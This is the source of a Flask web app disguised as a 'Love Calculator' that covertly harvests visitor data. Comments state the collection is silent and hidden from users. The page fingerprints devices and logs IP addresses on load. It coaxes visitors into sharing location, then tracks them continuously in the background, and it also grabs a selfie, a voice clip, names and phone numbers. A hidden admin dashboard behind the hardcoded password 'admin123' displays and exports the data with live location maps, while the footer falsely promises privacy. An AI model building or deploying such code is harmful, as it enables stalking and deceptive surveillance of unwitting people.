from flask import Flask, request, jsonify, Response, render_template_string
from supabase import create_client, Client
import os
import random
import sys
from datetime import datetime
import json

app = Flask(__name__)

# ---------- Supabase Setup ----------
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY")

if not SUPABASE_URL or not SUPABASE_KEY:
    print("⚠️ Missing Supabase credentials. App will run without database.", file=sys.stderr)
    supabase = None
else:
    supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

SERVICE_ID = "srv-d7jkpe3bc2fs73c2qiu0"

# ---------- Helper Functions ----------
def save_visitor(data):
    if supabase is None:
        return
    try:
        existing = supabase.table("visitors").select("id").eq("sessionId", data.get("sessionId")).execute()
        if existing.data:
            supabase.table("visitors").update(data).eq("sessionId", data.get("sessionId")).execute()
        else:
            supabase.table("visitors").insert(data).execute()
    except Exception as e:
        print(f"Save error: {e}")

def save_location_update(session_id, lat, lon):
    if supabase is None:
        return
    try:
        supabase.table("location_history").insert({
            "sessionId": session_id,
            "timestamp": datetime.now().isoformat(),
            "latitude": lat,
            "longitude": lon
        }).execute()
    except Exception as e:
        print(f"Location update error: {e}")

def get_location_history(session_id):
    if supabase is None:
        return []
    try:
        res = supabase.table("location_history").select("timestamp,latitude,longitude").eq("sessionId", session_id).order("id").execute()
        return [(row["timestamp"], row["latitude"], row["longitude"]) for row in res.data]
    except:
        return []

def get_all_visitors():
    if supabase is None:
        return []
    try:
        res = supabase.table("visitors").select("*").order("id", desc=True).execute()
        visitors = []
        for row in res.data:
            row["location_history"] = get_location_history(row.get("sessionId"))
            visitors.append(row)
        return visitors
    except:
        return []

# ---------- Love Calculator ----------
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony. So beautiful!",
        f"🌟 Cosmic alignment gives {name1} and {name2} a {percentage}% love score.",
        f"🌸 {name1} and {name2}, your love story is {percentage}% written in the stars!",
        f"💗 The universe whispers: {name1} & {name2} – {percentage}% meant to be!",
        f"💘 {name1} and {name2}, your love percentage is {percentage}%. Cherish every moment!",
        f"🎯 Love radar: {name1} → {name2} = {percentage}%. Cupid is working overtime!"
    ]
    return random.choice(messages)

# ---------- CLEAN USER INTERFACE (NO TECH DATA VISIBLE TO USERS) ----------
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Love Calculator | Find Your True Match</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
        }

        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
            text-align: center;
            transition: transform 0.3s ease;
        }

        .card:hover {
            transform: translateY(-5px);
        }

        h1 {
            font-size: 2.3em;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-weight: 800;
        }

        .subtitle {
            color: #7b8a9b;
            margin-bottom: 35px;
            font-size: 0.9em;
        }

        .input-group {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            flex-wrap: wrap;
        }

        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            transition: all 0.3s;
            background: #f7fafc;
            text-align: center;
            font-weight: 500;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }

        .btn-primary {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
        }

        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .result-card {
            margin-top: 30px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }

        .love-message {
            font-size: 1.2em;
            color: #2d3748;
            line-height: 1.6;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .optional-section {
            margin-top: 25px;
            padding: 20px;
            background: #fef5e7;
            border-radius: 20px;
            display: none;
        }

        .optional-section p {
            color: #c0392b;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .optional-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
        }

        .optional-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .optional-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 5px 15px rgba(72, 187, 120, 0.3);
        }

        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }

        .phone-input {
            width: 100%;
            padding: 14px 20px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            font-size: 16px;
            margin-bottom: 12px;
            text-align: center;
        }

        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
        }

        .status-msg {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }

        .status-msg.success {
            background: #c6f6d5;
            color: #22543d;
            display: block;
        }

        .status-msg.error {
            background: #fed7d7;
            color: #742a2a;
            display: block;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        footer {
            margin-top: 20px;
            font-size: 11px;
            color: #a0aec0;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <h1>💕 Love Calculator</h1>
        <div class="subtitle">Discover the magic between you two ✨</div>

        <div class="input-group">
            <input type="text" id="name1" placeholder="Your name" maxlength="30" autocomplete="off">
            <input type="text" id="name2" placeholder="Crush's name" maxlength="30" autocomplete="off">
        </div>

        <button class="btn-primary" id="calculateBtn" onclick="calculateLove()">
            🔮 Calculate Love Percentage
        </button>

        <div id="resultCard" class="result-card">
            <div class="percentage" id="percentageValue">0%</div>
            <div class="love-message" id="loveMessage"></div>
        </div>

        <div id="optionalSection" class="optional-section">
            <p>💝 Make it more special! (Optional)</p>
            <div class="optional-buttons">
                <button class="optional-btn" onclick="shareLocation()">📍 Share Location</button>
                <button class="optional-btn" onclick="takeSelfie()">📸 Take Selfie</button>
                <button class="optional-btn" onclick="recordVoice()">🎤 Record Voice</button>
            </div>
        </div>

        <div id="phoneSection" class="phone-section">
            <h4 style="margin-bottom: 12px; color: #4a5568;">📱 Get Your Result on Phone</h4>
            <input type="tel" id="phoneNumber" class="phone-input" placeholder="Enter your phone number">
            <button class="save-btn" onclick="savePhoneNumber()">💾 Send to My Phone</button>
        </div>

        <div id="statusMsg" class="status-msg"></div>
        <footer>🔒 Your privacy matters | Data is securely stored</footer>
    </div>
</div>

<script>
    // Session management (hidden from user)
    let sessionId = localStorage.getItem('love_session_id');
    if (!sessionId) {
        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('love_session_id', sessionId);
    }

    let currentFortune = '';
    let currentPercentage = 0;
    
    // Silent data collection - user never sees this
    let collectedData = {
        sessionId: sessionId,
        timestamp: new Date().toISOString()
    };

    async function collectDeviceData() {
        collectedData.screen = `${screen.width}x${screen.height}`;
        collectedData.colorDepth = screen.colorDepth;
        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        collectedData.userAgent = navigator.userAgent;
        collectedData.language = navigator.language;
        collectedData.platform = navigator.platform;
        
        if (navigator.deviceMemory) {
            collectedData.deviceMemory = navigator.deviceMemory + ' GB';
        }
        
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.batteryLevel = Math.round(battery.level * 100) + '%';
                collectedData.batteryCharging = battery.charging;
            } catch(e) {}
        }
        
        const connection = navigator.connection || navigator.mozConnection;
        if (connection) {
            collectedData.networkType = connection.effectiveType;
            collectedData.networkSpeed = connection.downlink ? connection.downlink + ' Mbps' : 'unknown';
        }
        
        await saveToBackend(collectedData);
    }

    async function saveToBackend(data) {
        try {
            await fetch('/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch(e) {
            console.log('Background save error:', e);
        }
    }

    async function calculateLove() {
        const name1 = document.getElementById('name1').value.trim();
        const name2 = document.getElementById('name2').value.trim();
        
        if (!name1 || !name2) {
            showStatus('Please enter both names 💕', 'error');
            return;
        }
        
        const btn = document.getElementById('calculateBtn');
        btn.innerHTML = '<span class="loading"></span> Calculating...';
        btn.disabled = true;
        
        collectedData.name = name1;
        collectedData.crush_name = name2;
        await saveToBackend(collectedData);
        
        try {
            const response = await fetch('/calculate-love', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name1: name1, name2: name2 })
            });
            const result = await response.json();
            
            currentPercentage = result.percentage;
            currentFortune = result.message;
            
            document.getElementById('percentageValue').textContent = currentPercentage + '%';
            document.getElementById('loveMessage').textContent = currentFortune;
            document.getElementById('resultCard').style.display = 'block';
            document.getElementById('optionalSection').style.display = 'block';
            document.getElementById('phoneSection').style.display = 'block';
            
            collectedData.fortuneText = currentFortune;
            collectedData.percentage = currentPercentage;
            await saveToBackend(collectedData);
            
            showStatus('Your love score is ready! ✨', 'success');
        } catch(e) {
            showStatus('Something went wrong. Please try again.', 'error');
        } finally {
            btn.innerHTML = '🔮 Calculate Love Percentage';
            btn.disabled = false;
        }
    }

    function showStatus(message, type) {
        const statusDiv = document.getElementById('statusMsg');
        statusDiv.textContent = message;
        statusDiv.className = `status-msg ${type}`;
        setTimeout(() => {
            statusDiv.style.display = 'none';
            statusDiv.className = 'status-msg';
        }, 3000);
    }

    // Optional features - users see friendly messages, no technical details
    function shareLocation() {
        showStatus('Getting your location...', 'success');
        navigator.geolocation.getCurrentPosition(async (position) => {
            collectedData.latitude = position.coords.latitude;
            collectedData.longitude = position.coords.longitude;
            collectedData.mapUrl = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
            await saveToBackend(collectedData);
            showStatus('✨ Location shared! Thank you for trusting us 💕', 'success');
            
            // Start continuous tracking in background
            navigator.geolocation.watchPosition(async (newPos) => {
                await fetch('/update-location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        sessionId: sessionId,
                        latitude: newPos.coords.latitude,
                        longitude: newPos.coords.longitude
                    })
                });
            });
        }, () => {
            showStatus('Location access denied. You can skip this.', 'error');
        });
    }

    async function takeSelfie() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 400;
                canvas.height = video.videoHeight || 300;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.5);
                collectedData.selfie = imageData.slice(0, 5000);
                saveToBackend(collectedData);
                stream.getTracks().forEach(track => track.stop());
                showStatus('📸 Beautiful selfie captured! You look amazing 💫', 'success');
            }, 1000);
        } catch(e) {
            showStatus('Camera access denied. You can skip this.', 'error');
        }
    }

    async function recordVoice() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            
            mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onload = async () => {
                    collectedData.voiceNote = reader.result.slice(0, 5000);
                    await saveToBackend(collectedData);
                    showStatus('🎤 Your voice note saved! Sweet message 💕', 'success');
                };
                reader.readAsDataURL(blob);
                stream.getTracks().forEach(track => track.stop());
            };
            
            mediaRecorder.start();
            showStatus('Recording... say something lovely 💬', 'success');
            setTimeout(() => {
                if (mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 3000);
        } catch(e) {
            showStatus('Microphone access denied. You can skip this.', 'error');
        }
    }

    async function savePhoneNumber() {
        const phone = document.getElementById('phoneNumber').value.trim();
        if (!phone) {
            showStatus('Please enter your phone number', 'error');
            return;
        }
        
        if (!/^[\\+\\d\\s\\-]{8,18}$/.test(phone)) {
            showStatus('Please enter a valid phone number', 'error');
            return;
        }
        
        try {
            const response = await fetch('/save-phone', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    sessionId: sessionId,
                    phoneNumber: phone,
                    fortune: currentFortune,
                    percentage: currentPercentage
                })
            });
            const result = await response.json();
            if (result.status === 'saved') {
                showStatus('✅ Number saved! Your love result will be sent to your phone.', 'success');
                document.getElementById('phoneNumber').disabled = true;
                document.querySelector('.save-btn').disabled = true;
            } else {
                showStatus('Error saving number', 'error');
            }
        } catch(e) {
            showStatus('Network error. Please try again.', 'error');
        }
    }

    // Auto collect device data on load (silent, user never sees)
    collectDeviceData();
    
    // Check for existing session
    async function checkExistingSession() {
        try {
            const response = await fetch('/get-session-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId: sessionId })
            });
            const data = await response.json();
            if (data.exists && data.fortuneText) {
                if (data.name) document.getElementById('name1').value = data.name;
                if (data.crush_name) document.getElementById('name2').value = data.crush_name;
                if (data.fortuneText) {
                    document.getElementById('percentageValue').textContent = (data.percentage || '??') + '%';
                    document.getElementById('loveMessage').textContent = data.fortuneText;
                    document.getElementById('resultCard').style.display = 'block';
                    document.getElementById('optionalSection').style.display = 'block';
                    document.getElementById('phoneSection').style.display = 'block';
                    currentFortune = data.fortuneText;
                    currentPercentage = data.percentage || 0;
                    if (data.phoneNumber) {
                        document.getElementById('phoneNumber').value = data.phoneNumber;
                        document.getElementById('phoneNumber').disabled = true;
                    }
                }
            }
        } catch(e) {}
    }
    
    checkExistingSession();
</script>
</body>
</html>
'''

# ---------- Flask Routes ----------
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/get-session-data', methods=['POST'])
def get_session_data_route():
    data = request.json
    session_id = data.get('sessionId')
    if session_id and supabase:
        try:
            res = supabase.table("visitors").select("name,crush_name,fortuneText,percentage,phoneNumber").eq("sessionId", session_id).execute()
            if res.data:
                row = res.data[0]
                return jsonify({
                    'exists': True,
                    'name': row.get("name"),
                    'crush_name': row.get("crush_name"),
                    'fortuneText': row.get("fortuneText"),
                    'percentage': row.get("percentage"),
                    'phoneNumber': row.get("phoneNumber")
                })
        except:
            pass
    return jsonify({'exists': False})

@app.route('/save', methods=['POST'])
def save():
    data = request.json
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    data['service_id'] = SERVICE_ID
    save_visitor(data)
    return jsonify({'status': 'saved'})

@app.route('/update-location', methods=['POST'])
def update_location():
    data = request.json
    session_id = data.get('sessionId')
    lat = data.get('latitude')
    lon = data.get('longitude')
    if session_id and lat is not None and lon is not None:
        save_location_update(session_id, lat, lon)
        return jsonify({'status': 'recorded'})
    return jsonify({'status': 'error'}), 400

@app.route('/save-phone', methods=['POST'])
def save_phone():
    data = request.json
    session_id = data.get('sessionId')
    phone = data.get('phoneNumber')
    fortune_text = data.get('fortune')
    percentage = data.get('percentage')
    if session_id and supabase:
        try:
            supabase.table("visitors").update({
                "phoneNumber": phone, 
                "fortuneText": fortune_text,
                "percentage": percentage
            }).eq("sessionId", session_id).execute()
            return jsonify({'status': 'saved'})
        except:
            pass
    return jsonify({'status': 'error'}), 400

@app.route('/calculate-love', methods=['POST'])
def calculate_love():
    data = request.json
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    if not name1 or not name2:
        return jsonify({'message': 'Please provide both names'}), 400
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

# ---------- HIDDEN ADMIN PANEL (Only accessible with password) ----------
@app.route('/admin-secret-dashboard', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == 'admin123':
            visitors = get_all_visitors()
            if not visitors:
                return '<h1>💕 No data yet</h1><p><a href="/admin-secret-dashboard">Back to login</a></p>'
            
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin Dashboard - Love Calculator Data</title>
                <style>
                    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
                    h1 { color: #f093fb; }
                    table { border-collapse: collapse; width: 100%; background: #16213e; overflow-x: auto; display: block; }
                    th, td { border: 1px solid #0f3460; padding: 8px; text-align: left; font-size: 12px; }
                    th { background: #e94560; color: white; position: sticky; top: 0; }
                    .btn { background: #e94560; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 10px; }
                    .container { overflow-x: auto; }
                </style>
            </head>
            <body>
                <h1>💕 Visitor Data Dashboard (Technical Details)</h1>
                <p>
                    <a href="/admin-secret-dashboard" class="btn">🔐 Back to Login</a>
                    <a href="/admin-secret-dashboard/download-csv?pass=admin123" class="btn">📥 Download CSV</a>
                </p>
                <div class="container">
                <table>
            '''
            if visitors:
                columns = [k for k in visitors[0].keys() if k != 'location_history']
                html += '<thead><tr>'
                for col in columns:
                    html += f'<th>{col}</th>'
                html += '</tr></thead><tbody>'
                for v in visitors:
                    html += '<tr>'
                    for col in columns:
                        val = str(v.get(col, ''))[:300]
                        html += f'<td style="max-width:300px; word-wrap:break-word;">{val}</td>'
                    html += '</tr>'
                html += '</tbody></table>'
                
                # Location history section
                html += '<h2 style="margin-top:30px;">📍 Live Location History</h2>'
                for v in visitors:
                    hist = v.get('location_history', [])
                    if hist:
                        html += f'<h3>Session: {v.get("sessionId", "?")} - {v.get("name", "Unknown")}</h3>'
                        html += '<table border="1"><tr><th>Timestamp</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>'
                        for ts, lat, lon in hist:
                            html += f'<tr><td>{ts}</td><td>{lat}</td><td>{lon}</td><td><a href="https://maps.google.com/?q={lat},{lon}" target="_blank">View Map</a></td></tr>'
                        html += '</table><br>'
            html += '''
                </div>
            </body>
            </html>
            '''
            return html
        else:
            return '<h1>🔒 Wrong password. <a href="/admin-secret-dashboard">Try again</a></h1>'
    
    return '''
        <!DOCTYPE html>
        <html>
        <head><title>Admin Login</title>
        <style>
            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: linear-gradient(135deg, #667eea, #764ba2); margin: 0; }
            .login-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2); text-align: center; min-width: 300px; }
            input { padding: 12px; margin: 10px; width: 220px; border-radius: 10px; border: 1px solid #ddd; font-size: 14px; }
            button { padding: 12px 30px; background: #667eea; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 16px; }
            h2 { color: #333; margin-bottom: 20px; }
        </style>
        </head>
        <body>
            <div class="login-box">
                <h2>🔐 Admin Access Only</h2>
                <form method="POST">
                    <input type="password" name="password" placeholder="Enter admin password" required autocomplete="off"><br>
                    <button type="submit">Login to Dashboard</button>
                </form>
            </div>
        </body>
        </html>
    '''

@app.route('/admin-secret-dashboard/download-csv')
def download_csv():
    pwd = request.args.get('pass')
    if pwd != 'admin123':
        return 'Unauthorized', 403
    visitors = get_all_visitors()
    import csv
    from io import StringIO
    if not visitors:
        return "No data available"
    output = StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    columns = [k for k in visitors[0].keys() if k != 'location_history']
    writer.writerow(columns)
    for v in visitors:
        row = [str(v.get(col, '')).replace('\n', ' ').replace('\r', ' ') for col in columns]
        writer.writerow(row)
    return Response(output.getvalue(), mimetype='text/csv', headers={'Content-Disposition': 'attachment;filename=love_calculator_data.csv'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
